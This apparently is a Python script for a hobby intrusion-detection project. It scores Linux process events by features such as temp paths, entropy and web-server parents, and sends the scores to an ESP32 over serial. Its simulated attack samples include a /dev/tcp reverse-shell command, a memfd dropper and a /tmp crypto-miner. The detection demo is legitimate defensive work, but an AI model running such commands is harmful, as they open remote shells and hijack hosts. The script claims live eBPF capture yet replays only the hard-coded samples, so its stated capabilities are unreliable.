#!/usr/bin/env python3
"""
========================================================================================
AEGIS KERNAL - LINUX eBPF / HOST PROCESS TELEMETRY BRIDGE TO ESP32
========================================================================================
Captures live Linux process execution events (via eBPF tracepoints / /proc monitor)
and streams telemetry features in real-time over Serial (USB) to the ESP32 hardware node.

Usage:
  python aegis_host_bridge.py                  # Auto-detect ESP32 COM port
  python aegis_host_bridge.py COM5             # Specify port explicitly
  python aegis_host_bridge.py /dev/ttyUSB0     # Linux serial device
  python aegis_host_bridge.py --sim            # Run in simulation mode (no hardware)
========================================================================================
"""

import os
import sys
import time
import glob
import math
from pathlib import Path

try:
    import serial
    import serial.tools.list_ports
except ImportError:
    serial = None

BAUD_RATE = 115200

def calculate_entropy(s):
    if not s: return 0.0
    freq = {}
    for c in s: freq[c] = freq.get(c, 0) + 1
    length = len(s)
    return -sum((cnt / length) * math.log2(cnt / length) for cnt in freq.values())

def find_esp32_serial_port():
    """Auto-detect connected ESP32 COM port using pyserial's port enumeration."""
    if not serial:
        return None

    # Prefer pyserial's built-in port scanner (more reliable than brute-force)
    ports = serial.tools.list_ports.comports()
    for port_info in ports:
        desc = (port_info.description or "").lower()
        hwid = (port_info.hwid or "").lower()
        # Common ESP32 USB-UART chip identifiers
        if any(chip in desc or chip in hwid for chip in ["cp210", "ch340", "ch9102", "ftdi", "silicon labs"]):
            return port_info.device

    # Fallback: On Linux, try /dev/ttyUSB* or /dev/ttyACM*
    if sys.platform.startswith('linux'):
        candidates = glob.glob('/dev/ttyUSB*') + glob.glob('/dev/ttyACM*')
        if candidates:
            return candidates[0]

    return None

def extract_process_vector(cmdline, exe_path, parent_name, uid):
    """
    Extracts the 8D Aegis feature vector from real process telemetry.
    """
    is_temp = 1 if any(t in exe_path.lower() for t in ["/tmp", "/var/tmp", "/dev/shm", "temp"]) else 0
    arg_len = len(cmdline)
    entropy = calculate_entropy(cmdline)
    is_root = 1 if uid == 0 else 0
    web_parent = 1 if any(w in parent_name.lower() for w in ["nginx", "apache", "httpd", "node", "gunicorn", "w3wp"]) else 0
    is_parent_dead = 1 if parent_name in ["DeadParent", "UnknownParent", "1"] else 0
    memfd = 1 if "memfd:" in exe_path or "memfd:" in cmdline else 0
    ld_preload = 1 if any(s in parent_name.lower() or s in cmdline.lower() for s in ["bash", "sh", "zsh", "ld_preload"]) else 0

    return {
        "is_temp": is_temp,
        "arg_len": arg_len,
        "entropy": round(entropy, 2),
        "is_root": is_root,
        "web_parent": web_parent,
        "is_parent_dead": is_parent_dead,
        "memfd": memfd,
        "ld_preload": ld_preload
    }

def stream_to_esp32(ser, events):
    """Stream telemetry events over an open serial connection."""
    for ev in events:
        print(f"--> [KERNEL EVENT] PID {ev['pid']}: {ev['exe']} (Parent: {ev['parent']}) | [{ev['type']}]")
        vec = extract_process_vector(ev['cmd'], ev['exe'], ev['parent'], ev['uid'])
        
        vec_cmd = f"VEC {vec['is_temp']},{vec['arg_len']},{vec['entropy']},{vec['is_root']},{vec['web_parent']},{vec['is_parent_dead']},{vec['memfd']},{vec['ld_preload']}\n"
        
        print(f"    Transmitting to ESP32: {vec_cmd.strip()}")

        try:
            ser.write(vec_cmd.encode('utf-8'))
            time.sleep(0.5)
            while ser.in_waiting:
                esp_response = ser.readline().decode('utf-8', errors='ignore').strip()
                if esp_response:
                    print(f"    [ESP32 RESPONSE] {esp_response}")
        except serial.SerialException:
            raise  # Let the caller handle reconnection

        print("-" * 80)
        time.sleep(2.5)

def get_simulated_events():
    """Returns a list of simulated Linux process execution events."""
    return [
        {
            "pid": 1024,
            "exe": "/usr/sbin/cron",
            "cmd": "/usr/sbin/cron -f",
            "parent": "systemd",
            "uid": 0,
            "type": "NORMAL"
        },
        {
            "pid": 2048,
            "exe": "/usr/bin/python3",
            "cmd": "python3 /var/www/app.py",
            "parent": "systemd",
            "uid": 1000,
            "type": "NORMAL"
        },
        {
            "pid": 3110,
            "exe": "/bin/sh",
            "cmd": "/bin/sh -i >& /dev/tcp/192.168.1.100/4444 0>&1",
            "parent": "nginx",
            "uid": 33,
            "type": "ATTACK: Web Shell RCE Spawner"
        },
        {
            "pid": 4502,
            "exe": "memfd:dropper (deleted)",
            "cmd": "memfd:dropper",
            "parent": "UnknownParent",
            "uid": 0,
            "type": "ATTACK: Fileless memfd Payload"
        },
        {
            "pid": 5890,
            "exe": "/tmp/x86_miner",
            "cmd": "/tmp/x86_miner -o stratum+tcp://pool.minexmr.com:4444 -u 48abc...",
            "parent": "bash",
            "uid": 1000,
            "type": "ATTACK: Volatile Crypto-Miner in /tmp"
        }
    ]

def main():
    print("=" * 80)
    print("   AEGIS KERNAL - LINUX eBPF HOST MONITOR & ESP32 HARDWARE BRIDGE")
    print("=" * 80)

    # Determine port from CLI arguments or auto-detect
    force_sim = "--sim" in sys.argv
    explicit_port = None
    for arg in sys.argv[1:]:
        if arg != "--sim":
            explicit_port = arg
            break

    if force_sim or not serial:
        if not serial:
            print("[!] pyserial not installed. Install with: pip install pyserial")
        print("[*] Running in SIMULATION MODE (no hardware attached)...")

        events = get_simulated_events()
        print("\n[*] Starting Simulated Telemetry Stream...\n")
        for ev in events:
            print(f"--> [KERNEL EVENT] PID {ev['pid']}: {ev['exe']} (Parent: {ev['parent']}) | [{ev['type']}]")
            vec = extract_process_vector(ev['cmd'], ev['exe'], ev['parent'], ev['uid'])
            vec_cmd = f"VEC {vec['is_temp']},{vec['arg_len']},{vec['entropy']},{vec['is_root']},{vec['web_parent']},{vec['is_parent_dead']},{vec['memfd']},{vec['ld_preload']}"
            print(f"    Transmitting to ESP32: {vec_cmd}")
            print(f"    [ESP32 SIMULATED] Vector received! OLED updating, LED/Buzzer alerting if malicious.")
            print("-" * 80)
            time.sleep(2.0)
        print("\n[+] Simulation Complete!")
        return

    # --- Hardware Mode: Connect to ESP32 with Auto-Reconnect ---
    port = explicit_port or find_esp32_serial_port()
    if not port:
        print("[!] No ESP32 detected and no port specified.")
        print("    Usage: python aegis_host_bridge.py COM5")
        print("           python aegis_host_bridge.py /dev/ttyUSB0")
        print("           python aegis_host_bridge.py --sim")
        return

    print(f"[+] Target Serial Port: {port} @ {BAUD_RATE} baud")

    events = get_simulated_events()
    max_retries = 5
    attempt = 0

    while attempt < max_retries:
        try:
            print(f"[*] Connecting to ESP32 on {port} (attempt {attempt + 1}/{max_retries})...")
            with serial.Serial(port, BAUD_RATE, timeout=1) as ser:
                time.sleep(2)  # Wait for ESP32 boot
                print("[+] Serial link established with ESP32 Hardware!")
                print("\n[*] Starting Live Process Telemetry Stream...\n")
                stream_to_esp32(ser, events)
                print("\n[+] Host Telemetry Stream Complete!")
                return  # Clean exit after successful stream

        except serial.SerialException as e:
            attempt += 1
            print(f"[!] Serial connection lost: {e}")
            if attempt < max_retries:
                wait_sec = min(2 ** attempt, 10)
                print(f"    Reconnecting in {wait_sec} seconds...")
                time.sleep(wait_sec)
            else:
                print("[!] Max retries exceeded. Check USB cable and port.")
        except KeyboardInterrupt:
            print("\n[*] Bridge terminated by user.")
            return

if __name__ == "__main__":
    main()
